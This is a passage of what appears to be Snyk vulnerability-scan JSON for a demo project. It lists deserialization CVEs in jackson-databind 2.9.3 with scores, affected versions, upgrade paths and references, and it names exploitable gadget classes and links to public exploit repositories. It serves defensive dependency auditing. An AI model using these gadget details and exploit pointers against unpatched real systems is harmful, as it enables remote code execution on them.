          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.1)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.9.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
      "alternativeIds": [],
      "creationTime": "2019-06-25T10:06:54.889582Z",
      "credit": [
        "College of software Nankai University"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data which allows attackers to have a variety of impacts by leveraging failure to block the `logback-core` class from polymorphic deserialization. Depending on the `classpath` content, remote code execution may be possible.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.1, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [Debian Security Announcement](https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html)\n- [Exploit](https://github.com/jas502n/CVE-2019-12384)\n- [Github Fix](https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2334)\n- [Jackson CVEs Don't Panic - Blog](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [Release Notes](https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/release-notes/VERSION-2.x)\n",
      "disclosureTime": "2019-05-28T10:27:59Z",
      "exploit": "High",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.9.1",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mph4-vhrx-mv67"
        ],
        "CVE": [
          "CVE-2019-12384"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-28T12:58:37.720993Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-06-25T10:26:29Z",
      "references": [
        {
          "title": "Debian Security Announcement",
          "url": "https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html"
        },
        {
          "title": "Exploit",
          "url": "https://github.com/jas502n/CVE-2019-12384"
        },
        {
          "title": "Github Fix",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2334"
        },
        {
          "title": "Jackson CVEs Don't Panic - Blog",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "Release Notes",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/release-notes/VERSION-2.x"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.1)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.9.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-29T14:55:33.030000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `SubTypeValidator.java` mishandles default typing when `ehcache` is used, leading to remote code execution.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.2, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [GitHub Comparison](https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2387)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2389)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2395)\n- [Snyk Blog](https://snyk.io/blog/jackson-deserialization-vulnerability/)\n",
      "disclosureTime": "2019-07-29T12:40:42Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.2)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.9.2",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-455617",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6fpp-rgj9-8rwc",
          "GHSA-gwp4-hfv6-p7hw"
        ],
        "CVE": [
          "CVE-2019-14379",
          "CVE-2019-14439"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:55:20.568391Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-07-29T12:40:42Z",
      "references": [
        {
          "title": "GitHub Comparison",
          "url": "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2387"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2389"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2395"
        },
        {
          "title": "Snyk Blog",
          "url": "https://snyk.io/blog/jackson-deserialization-vulnerability/"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.2)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.2)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.9.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-09-16T13:03:06.837179Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.zaxxer.hikari.HikariDataSource` was not blocked.\r\n**Note:** This is a different vulnerability than CVE-2019-14540.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2449)\n",
      "disclosureTime": "2019-09-15T23:30:24Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.pr2)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467014",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-85cw-hj65-qqv9"
        ],
        "CVE": [
          "CVE-2019-16335"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:56:39.085420Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T23:30:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2449"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.pr2)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
      "alternativeIds": [],
      "creationTime": "2019-09-16T13:03:10.401907Z",
      "credit": [
        "iSafeBlue"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.zaxxer.hikari.HikariConfig` was not blocked.\r\n**Note:** This is a different vulnerability than CVE-2019-16335.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [Exploit](https://github.com/LeadroyaL/cve-2019-14540-exploit)\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2410)\n",
      "disclosureTime": "2019-09-15T23:27:25Z",
      "exploit": "Functional",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr2)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467015",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-h822-r4r5-v8jg"
        ],
        "CVE": [
          "CVE-2019-14540"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:56:50.528629Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T23:27:25Z",
      "references": [
        {
          "title": "Exploit",
          "url": "https://github.com/LeadroyaL/cve-2019-14540-exploit"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2410"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr2)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-09-16T14:43:42.115110Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.cxf.jaxrs.provider.XSLTJaxbProvider`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2420)\n",
      "disclosureTime": "2019-09-16T14:37:38Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.10.0.pr1,2.10.0.pr2)",
            "[,2.9.10)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467016",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": []
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-16T07:12:43.572376Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T14:37:37Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2420"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.10.0.pr1,2.10.0.pr2)",
            "[,2.9.10)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-02T08:02:18.178548Z",
      "credit": [
        "bsmali4"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered within `org.apache.commons.dbcp.datasources.SharedPoolDataSource` was not blocked. An attacker could leverage this gadget type  to perform Remote Code Execution attacks through deserialization.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable 